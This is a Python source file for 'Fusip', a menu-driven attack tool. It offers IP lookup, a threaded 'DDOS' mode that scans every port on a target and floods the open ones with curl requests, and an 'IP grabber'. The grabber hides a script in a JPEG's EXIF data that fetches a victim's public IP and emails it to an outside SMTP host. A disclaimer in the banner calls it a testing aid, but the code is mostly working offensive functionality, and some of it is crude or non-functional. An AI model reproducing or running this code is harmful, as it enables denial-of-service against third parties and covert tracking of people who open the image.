import time
import requests
import subprocess
import socket
import threading
from queue import Queue
from email.mime.text import MIMEText
import smtplib
import ipaddress
import piexif
from PIL import Image, ImageDraw
import pprint
import pyfiglet

# Functions for colored printing

def print_error(message):
    print("\033[91m" + message + "\033[0m")

def print_warning(message):
    print("\033[93m" + message + "\033[0m")

def print_success(message):
    print("\033[92m" + message + "\033[0m")

def print_info(message):
    print("\033[94m" + message + "\033[0m")


print_info("""

              Welcome developers to my first project: Fusip.
              I hope this will assist you in your testing.
              Unauthorized use for malicious purposes is strictly prohibited; I hold no responsibility for such actions.
              Here is my GitHub repository: https://github.com/Gekiidoo
              Here is my discord: https://discord.gg/SrJgUTQcAH
              
              """)

# Import your API key here ( to get a free key : https://ipinfo.io )
API_KEY = None

# Function to perform IP analysis
def ipscan():
    if not API_KEY:
        print_error("Please input your API key.")
        time.sleep(1)
        return

    ip_address = input("\033[93mWhat is the IP address to analyze? :\033[0m ").strip()

    try:
        ipaddress.IPv4Address(ip_address)
    except ipaddress.AddressValueError:
        print_error("Error: Invalid IPv4 address format")
        time.sleep(3)
        return

    if not ip_address:
        print_error("Error: you must enter an IP")
        time.sleep(3)
        return

    url = f"https://ipinfo.io/{ip_address}/json?token={API_KEY}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        print("\n")
        print_info("IP address information:")
        print("\n")
        pprint.pprint(data)
        time.sleep(3)
    else:
        print_error("Error retrieving information for the IP address.")
        time.sleep(3)

# Function for IP grabber
def ipgrabber():
    image = Image.new("RGB", (1, 1), (255, 255, 255))
    draw = ImageDraw.Draw(image)

    draw.point((0, 0), fill=(255, 255, 255))

    image_with_metadata = "ipgrabber_image_with_metadata.jpg"
    image.save(image_with_metadata)
    
    # Function to send an email
    def send_email(ip_address):
        sender_email = "your_email@example.com"
        receiver_email = "recipient@example.com"
        password = "your_email_password"

        message = MIMEText(f"IP Address: {ip_address}")
        message['Subject'] = 'IP Address Information'
        message['From'] = sender_email
        message['To'] = receiver_email

        try:
            server = smtplib.SMTP_SSL('smtp.example.com', 465)
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print_success("Email sent successfully")
            server.quit()
        except Exception as e:
            print_error("Error sending email: " + str(e))

    def get_public_ip():
        try:
            response = requests.get('https://api.ipify.org')
            return response.text
        except Exception as e:
            print_error("Error getting public IP: " + str(e))
            return None
   
    ip_address = get_public_ip()
    if ip_address:
        send_email(ip_address)
    else:
        print_warning("Unable to retrieve public IP address")

    script_content = """
import requests
import smtplib
from email.mime.text import MIMEText

def send_email(ip_address):
    sender_email = "your_email@example.com"
    receiver_email = "recipient@example.com"
    password = "your_email_password"

    message = MIMEText(f"IP Address: {ip_address}")
    message['Subject'] = 'IP Address Information'
    message['From'] = sender_email
    message['To'] = receiver_email

    try:
        server = smtplib.SMTP_SSL('smtp.example.com', 465)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print_success("Email sent successfully")
        server.quit()
    except Exception as e:
        print_error("Error sending email: " + str(e))

ip_address = requests.get('https://api.ipify.org').text
send_email(ip_address)
"""

    exif_dict = {"Exif": {piexif.ExifIFD.UserComment: script_content.encode("utf-8")}}
    exif_bytes = piexif.dump(exif_dict)
    piexif.insert(exif_bytes, image_with_metadata)

    print("\n")
    print_success("Image generated successfully.")
    time.sleep(1)
    print_info("Make sure to rename the image.")
    time.sleep(5)

# Function for DDOS attack
def ddos_attack(ip_address, queue, max_attempts=3):
    open_ports = []
    
    for port in range(1, 65536):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((ip_address, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    
    print_info(f"Open ports on {ip_address}: {open_ports}")
    
    if not open_ports:
        print_info("No open ports found. Exiting DDOS attack.")
        return
    
    for port in open_ports:
        attempts = 0
        connected = False
        while attempts < max_attempts:
            try:
                # Use subprocess to execute curl command which sends an HTTP request to the target IP address
                subprocess.Popen(['curl', '-s', f'http://{ip_address}:{port}'])
                print_info(f"Request sent to {ip_address}:{port}")
                connected = True
                break
            except Exception as e:
                print_info(f"Error in connection: {e}")
                time.sleep(5)
                attempts += 1
        if connected:
            print_info(f"Connected to {ip_address}:{port}")
        queue.task_done()

# Function to initiate DDOS attack
def ipddos():
    print("\n")
    print_info("The DDOS IP functionality is being executed.")
    ip_address = input("\033[94mEnter the IP address to attack: \033[0m").strip()
    if not ip_address:
        print_error("Error: you must enter an IP")
        time.sleep(3)
        return ipddos()
    num_connections = int(input("\033[94mEnter the number of connections to establish: \033[0m"))

    queue = Queue()
    for _ in range(num_connections):
        t = threading.Thread(target=ddos_attack, args=(ip_address, queue))
        t.daemon = True
        t.start()

    for _ in range(num_connections):
        queue.put(None)

    queue.join()

    print("\n")
    print_success("DDOS attack completed.")

# Function to display ASCII art
def display_ascii_art():
    text = "FUSIP"
    ascii_art = pyfiglet.figlet_format(text, font="big")
    print("\033[95m" + ascii_art + "\033[0m")

# Displaying ASCII art
display_ascii_art()

# Main loop
while True:
    print_info("1 : IP scan (IPv4 only)")
    print_info("2 : IP DDOS")
    print_info("3 : IP grabber")
    print_info("4 : Quit")

    x = int(input("Choose between 1, 2, 3 or 4 : "))

    if x == 1:
        ipscan()
        print("\n")
    elif x == 2:
        ipddos()
        print("\n")
    elif x == 3:
        ipgrabber()
        print("\n")
    elif x == 4:
        break
    else:
        print_warning("Invalid choice, please try again.")
        time.sleep(3)
        print("\n" * 2)
